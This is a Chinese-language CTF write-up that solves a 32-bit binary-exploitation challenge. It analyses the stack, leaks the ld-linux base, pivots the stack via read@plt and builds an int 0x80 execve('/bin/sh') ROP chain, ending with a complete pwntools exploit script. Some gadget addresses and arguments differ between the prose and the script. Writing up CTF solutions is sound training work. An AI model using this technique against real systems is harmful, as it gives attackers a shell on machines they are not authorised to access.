---
title: BreakTheSyntaxCTF - You cannot exe
categories: [ctf2026, BreakTheSyntaxCTF]
tags: [pwn, stack-pivot, rop]
---

### 0x01 栈行为分析
32位程序，没有PIE和canary.
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[12]; // [esp+8h] [ebp-10h] BYREF

  write(1, buf, 0x40u);
  read(0, buf, 0x1Cu);
  return 0;
}
```

```asm
.text:08049040 8D 4C 24 04                             lea     ecx, [esp+4]
.text:08049044 83 E4 F0                                and     esp, 0FFFFFFF0h
.text:08049047 FF 71 FC                                push    dword ptr [ecx-4]
.text:0804904A 55                                      push    ebp
.text:0804904B 89 E5                                   mov     ebp, esp
.text:0804904D 51                                      push    ecx
.text:0804904E 83 EC 14                                sub     esp, 14h
.text:08049051 83 EC 04                                sub     esp, 4
.text:08049054 6A 40                                   push    40h ; '@'       ; n
.text:08049056 8D 45 F0                                lea     eax, [ebp+buf]
.text:08049059 50                                      push    eax             ; buf
.text:0804905A 6A 01                                   push    1               ; fd
.text:0804905C E8 AF FF FF FF                          call    _write
.text:08049061 83 C4 10                                add     esp, 10h
.text:08049064 83 EC 04                                sub     esp, 4
.text:08049067 6A 1C                                   push    1Ch             ; nbytes
.text:08049069 8D 45 F0                                lea     eax, [ebp+buf]
.text:0804906C 50                                      push    eax             ; buf
.text:0804906D 6A 00                                   push    0               ; fd
.text:0804906F E8 AC FF FF FF                          call    _read
.text:08049074 83 C4 10                                add     esp, 10h
.text:08049077 B8 00 00 00 00                          mov     eax, 0
.text:0804907C 8B 4D FC                                mov     ecx, [ebp+var_4]
.text:0804907F C9                                      leave
.text:08049080 8D 61 FC                                lea     esp, [ecx-4]
.text:08049083 C3                                      retn
```
以前对32位程序分析的较少，这一次来研究一下它的栈行为.
- 栈对齐
```asm
lea     ecx, [esp+4]
and     esp, 0FFFFFFF0h
push    dword ptr [ecx-4]
```
起初[esp] = ret_addr, [esp+4] = argc (或者说，是参数列表的起始地址)
因为接下来要进行栈对齐（0x10对齐），所以要对原始的栈和参数地址进行保存. old-esp保存在ecx中，old-arg-addr保存在栈上.

- 栈空间初始化
```asm
push    ebp
mov     ebp, esp
push    ecx
sub     esp, 14h
```
然后将ebp也压到栈上，自从栈0x10对齐后，现在已经压入了2个数据，所以是0x8对齐，但是不是0x10对齐. (因为32位下push只有4字节)

让ebp指向当前的esp, 接着压入ecx (参数列表的起始地址), 给esp分配0x14的空间.

push ebp (0x8) -> push ecx(0xc) -> sub esp,14h (0x10对齐)

- 函数调用与维护
```asm
sub     esp, 4
push    40h ; '@'       ; n
lea     eax, [ebp+buf]
push    eax             ; buf
push    1               ; fd
call    _write
add     esp, 10h
```
栈由调用者维护，比较符合直觉.
一个比较有意思的点是，write有3个参数，编译器为了补足0x10, 在刚开始的时候做了sub esp,4.  在最后又将3个参数+1个padding的总共0x10空间给恢复

- main函数返回
```asm
mov     ecx, [ebp+var_4]   (var_4 = -4)
leave
lea     esp, [ecx-4]
retn
```
函数中的栈状态如下：
```
    ┌────────────┐aligned esp
0x4 │ ret_addr   │           
    ┌────────────┐           
0x4 │ old_ebp    │           
    ┌────────────┐ebp        
0x4 │ argc_addr  │           
    ┌────────────┐           
    │            │           
    │            │           
0x14│            │           
    │            │           
    │            │           
    └────────────┘esp
```
首先将argc_addr的地址传给ecx, 因为只有这一个变量是和对齐之前的栈相关的，需要借助它来恢复栈.

leave 等价于`mov esp, ebp; pop ebp`,变成：
```
    ┌────────────┐aligned esp
0x4 │ ret_addr   │           
    ┌────────────┐esp   (ebp已恢复) 
```
然后将esp恢复到对齐前的位置, return. （并没有使用到对齐后压栈的ret_addr）

### 0x02 攻击思路
程序没有使用libc, 而是使用了自己编写的libponi.so来提供IO函数。这导致我们无法利用system函数.
```
(venv14) woc@myarch:BreakSyntaxCTF/cannot_exe $ ldd ./a.out
linux-gate.so.1 (0xf7ed3000)
libponi.so (0xf7ec6000)
./ld-linux.so.2 => /usr/lib/ld-linux.so.2 (0xf7ed6000)
```
找一下ld-linux.so.2中的gadget,发现虽然没有syscall,但是有int 80（定位和syscall接近）. 这是linux中的软件中断，eax存放系统调用号，ebx,ecx,edx,esi,edi,ebp分别作为前6个参数.

然后让ai找gadget, 有一个一次性的：
```
22d44: 8b 4c 24 18    mov ecx,DWORD PTR [esp+0x18]
22d48: 8b 54 24 1c    mov edx,DWORD PTR [esp+0x1c]
22d4c: 8b 5c 24 14    mov ebx,DWORD PTR [esp+0x14]
22d50: 8b 74 24 20    mov esi,DWORD PTR [esp+0x20]
22d54: 8b 7c 24 24    mov edi,DWORD PTR [esp+0x24]
22d58: cd 80          int 0x80
```
然后配合一个控制eax的gadget即可:
```

```

> **ai寻找gadget的过程**
>
>  1. 先列所有 int 0x80
>
>  ROPgadget --binary ./ld-linux.so.2 --only 'int'
>
>  或更宽一点：
>
>  ROPgadget --binary ./ld-linux.so.2 --only 'mov|pop|int|ret'
>
>  但这个输出会很多，所以我通常先 grep：
>
>  ROPgadget --binary ./ld-linux.so.2 --only 'mov|pop|int|ret' | grep 'int 0x80'
>
>  2. 优先找能控制 eax 的 gadget
>
>  我们要 execve，所以需要：
>
>  eax = 11
>
>  过滤：
>
>  ROPgadget --binary ./ld-linux.so.2 --only 'mov|pop|ret' | grep 'mov eax'
>
>  或者更具体：
>
>  ROPgadget --binary ./ld-linux.so.2 --only 'mov|pop|ret' | grep 'mov eax, ebp'
>
>  找到：
>
>  0x0000bea0 : mov eax, ebp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
>
>  再找：
>
>  ROPgadget --binary ./ld-linux.so.2 --only 'pop|ret' | grep 'pop ebp'
>
>  找到：
>
>  0x000026f9 : pop ebp ; ret
>
>  于是可以构造：
>
>  pop ebp ; ret
>  11
>  mov eax, ebp ; ...
>
>  这样 eax = 11。
>
>  3. 找能设置 ebx/ecx/edx 后 int 0x80 的 gadget
>
>  目标寄存器：
>
>  ebx = "/bin/sh"
>  ecx = argv
>  edx = NULL
>
>  所以我会先搜带 int 0x80 且前面有 mov ebx、mov ecx、mov edx 的 gadget：
>
>  ROPgadget --binary ./ld-linux.so.2 --depth 30 --only 'mov|int|pop|ret|cmp|ja' | grep >  'int 0x80' | grep 'mov ebx'
>
>  再缩小：
>
>  ROPgadget --binary ./ld-linux.so.2 --depth 30 --only 'mov|int|pop|ret|cmp|ja' | grep >  'int 0x80' | grep 'mov ebx' | grep 'mov ecx'
>
>  再看有没有 mov edx：
>
>  ROPgadget --binary ./ld-linux.so.2 --depth 30 --only 'mov|int|pop|ret|cmp|ja' | grep >  'int 0x80' | grep 'mov ebx' | grep 'mov ecx' | grep 'mov edx'
>
>  这时就能找到：
>
>  0x00022d44 : mov ecx, dword ptr [esp + 0x18] ; mov edx, dword ptr [esp + 0x1c] ; mov >  ebx, dword ptr [esp + 0x14] ; mov esi, dword ptr [esp + 0x20] ; mov edi, dword
>  ptr [esp + 0x24] ; int 0x80
>
>  它正好能从栈上加载 ecx/edx/ebx，然后 int 0x80
{: .prompt-tip }

gadget需要我们能够控制esp相关的值，后续尝试通过栈迁移来解决.
寻找影响esp的代码，发现只需要将ebp-4位置的值修改成`target_addr+4`即可. 但是后续还有一个retn, 所以我们需要保证那里已经提前布置好的rop链.
```asm
mov     ecx, [ebp+var_4]   (var_4 = -4)
leave
lea     esp, [ecx-4]
retn
```

接下来思路就清晰了：先通过一次rop, 调用read@plt, 向目标地址布置好rop链， 返回然后通过栈迁移，将esp迁移过去的同时对其进行执行.

### 0x03 栈迁移打法
这一题会泄露栈上的64字节数据，可能包含其他库的指针.
```
0x0
0xf7f82460
0xf7f9da90
0xfff638a4
0xfff638ac
0x804908f
0x804908f
0x0
0x0
0x0
0x1
0xfff63d81
0x0
0xfff63da6
0xfff63db5
0xfff63dce

pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
     Start        End Perm     Size Offset File (set vmmap-prefer-relpaths on)
 0x8048000  0x8049000 r--p     1000      0 a.out
 0x8049000  0x804a000 r-xp     1000   1000 a.out
 0x804a000  0x804b000 r--p     1000   2000 a.out
 0x804b000  0x804c000 r--p     1000   2000 a.out
 0x804c000  0x804d000 rw-p     1000   3000 a.out
0xf7f57000 0xf7f58000 r--p     1000      0 libponi.so
0xf7f58000 0xf7f59000 r-xp     1000   1000 libponi.so
0xf7f59000 0xf7f5a000 r--p     1000   2000 libponi.so
0xf7f5a000 0xf7f5b000 r--p     1000   2000 libponi.so
0xf7f5b000 0xf7f5c000 rw-p     1000   3000 libponi.so
0xf7f5c000 0xf7f5e000 rw-p     2000      0 [anon_f7f5c]
0xf7f5e000 0xf7f62000 r--p     4000      0 [vvar]
0xf7f62000 0xf7f64000 r--p     2000      0 [vvar_vclock]
0xf7f64000 0xf7f67000 r-xp     3000      0 [vdso]
0xf7f67000 0xf7f68000 r--p     1000      0 ld-linux.so.2
0xf7f68000 0xf7f8c000 r-xp    24000   1000 ld-linux.so.2
0xf7f8c000 0xf7f9b000 r--p     f000  25000 ld-linux.so.2
0xf7f9b000 0xf7f9d000 r--p     2000  33000 ld-linux.so.2
0xf7f9d000 0xf7f9e000 rw-p     1000  35000 ld-linux.so.2
0xfff43000 0xfff65000 rw-p    22000      0 [stack]
```
经过试验可以发现，泄露的第2个dword属于ld-linux.so.2中，而且其值和ld-base差值固定: `0xf7f82460 - 0xf7f67000 = 0x1b460`.

有了ld的地址后，就能够构造bss段上的rop链了. 接下来控制第一次的read@plt. 我们能够从buf = $ebp-0x10开始，写入0x1c字节，
```
pwndbg> x/20wx $ebp-0x10
0xff87c4c8:     0x00000040      0xf7f18fec      0xff87c52c      0x08049084
0xff87c4d8:     0xff87c508      0x08049074      0x00000000      0xff87c4f8
```
如果我们不干涉原有逻辑的话，程序会根据0xff87c4dc处的返回地址跳转（真正的返回地址，而不是后续在0xff87c4d4处又压入的）. 我们最多只能够控制到0xff87c4e0对应的4字节，并不能很舒服地构造read@plt参数.

如果进行干涉呢？我们可以将ebp - 0x4的位置替换成target + 4, 在最后retn前，esp就会落在target位置.
```
mov     ecx, [ebp-4]
leave
lea     esp, [ecx-4]
retn
```
但是这样，相当于我们在7个dword中的第4个，硬性要求我们写成一个`target + 4`. 还有足够的空间给read@plt布局参数吗？

但是巧妙的是，如果我们在buf-0x10开始分别放入read@plt, new_ret_addr, o(stdin), 那么第二个buffer参数刚好可以复用我们的target+4, 再往后放上length即可.

> 这里需要注意的是：对于32位程序，一个plt后面并不是立即跟上参数，而是先跟上返回地址. (因为正向调用的时候，是先压入参数，然后call压入地址)
{: .prompt-warning }

根据泄露的第四个数据(argc的地址)确定target_addr
```python
buf = w[3] - 0x1c
target_addr = buf
```
```
.---------------.
|               |
V               |
read@plt + target_addr + 0(stdin) + (target_addr+4)(buf) + length + 0 + 0
```
在执行read@plt的时候，栈帧会有新的变动，但是可以保证，在retn前，esp一定是落在target_addr的位置的. 也就是说，我们可以在read的时候，覆盖这个值，将其指向我们布置的rop-chain.
而read@plt的buf参数因为是复用的(target_addr+4)，刚好可以指向这个位置！

所以第二轮的payload, 开头就是布置的rop-chain.
先设置eax参数：
```python
chain = [
    ld_base + POP_EBP,
    11,                         # eax = execve
    ld_base + MOV_EAX_EBP_POP4_RET,
    0, 0, 0, 0,
    ld_base + SYSCALL_LOAD_ARGS,
]
```
后面的SYSCALL_LOAD_ARGS:
```asm
mov    0x18(%esp),%ecx
mov    0x1c(%esp),%edx
mov    0x14(%esp),%ebx
mov    0x20(%esp),%esi
mov    0x24(%esp),%edi
int    $0x80
```
我们要设置 
```
ebx = arg0 = (char*)"/bin/sh"
ecx = arg1 = argv
edx = arg2 = NULL
```
ret落在SYSCALL_LOAD_ARGS后, 也就是说，chain后接的是$esp+0x0:
```python
bin_sh = target_addr + 4 + len(chain) + 4*10
payload2 = flat(
    chain,
    0,0,0,0,0,
    bin_sh, # ebx
    argv,   # ecx
    0,      # edx
    0,
    0
) + b"/bin/sh\x00"
```

### 0x04 完整脚本
```python
#!/usr/bin/env python3
import sys

RAW_ARGS = tuple(sys.argv[1:])

from pwn import *
import os
import shutil

context.arch = "i386"
context.gdb_binary = "/usr/local/bin/pwndbg"

elf = ELF("./a.out", checksec=False)

ld_path = "./ld-linux.so.2"
libc_dir = os.path.abspath(".")

HOST = "some.website"
PORT = 1337
SSL = False

context.binary = elf

if os.environ.get("TMUX"):
    context.terminal = ["tmux", "splitw", "-h"]
elif os.environ.get("DISPLAY"):
    for terminal in ("ghostty", "alacritty", "kitty", "konsole"):
        if shutil.which(terminal):
            context.terminal = [terminal, "-e"]
            break

gdbscript = r"""
set pagination off
set breakpoint pending on
set auto-solib-add on
b *0x8049077
b *0x8049083
c
"""

def start():
    def has_flag(name):
        return name in RAW_ARGS or any(arg.startswith(name + "=") for arg in RAW_ARGS)

    remote_enabled = has_flag("REMOTE") or bool(args.REMOTE)
    debug_enabled = (
        has_flag("DEBUG")
        or has_flag("GDB")
        or bool(args.DEBUG)
        or bool(args.GDB)
    )

    if remote_enabled:
        return remote(HOST, PORT, ssl=SSL)

    if debug_enabled:
        p = process([ld_path, "--library-path", libc_dir, elf.path])
        log.info("Attaching gdb using terminal: %r", context.terminal)
        gdb.attach(p, gdbscript=gdbscript)
        return p

    return process([ld_path, "--library-path", libc_dir, elf.path])


p = start()


READ_PLT = 0x8049020
POP_EBP = 0x26f9
MOV_EAX_EBP_POP4_RET = 0xbe8d
SYSCALL_LOAD_ARGS = 0x22d44


leak = p.recv(64)

w = [u32(leak[i:i+4]) for i in range(0, 64, 4)]

ld_base = w[1] - 0x1b460
print(f'ld base: {hex(ld_base)}')
assert(ld_base & 0xfff == 0)

read_length = 0x100

buf = w[3] - 0x1c
target_addr = buf

payload = flat(
    READ_PLT,
    0xdeadbeef,
    0,
    target_addr + 4,
    read_length,
    0,
    0
)
p.send(payload)

chain = [
    ld_base + POP_EBP,
    11,                         # eax = execve
    ld_base + MOV_EAX_EBP_POP4_RET,
    0, 0, 0, 0,
    ld_base + SYSCALL_LOAD_ARGS,
]

bin_sh = target_addr + 4 + 4*len(chain) + 4*10
payload2 = flat(
    chain,
    0,0,0,0,0,
    bin_sh, # ebx
    0,   # ecx
    0,      # edx
    0,
    0
) + b"/bin/sh\x00"

p.send(payload2)
# ===== exploit here =====

p.interactive()
```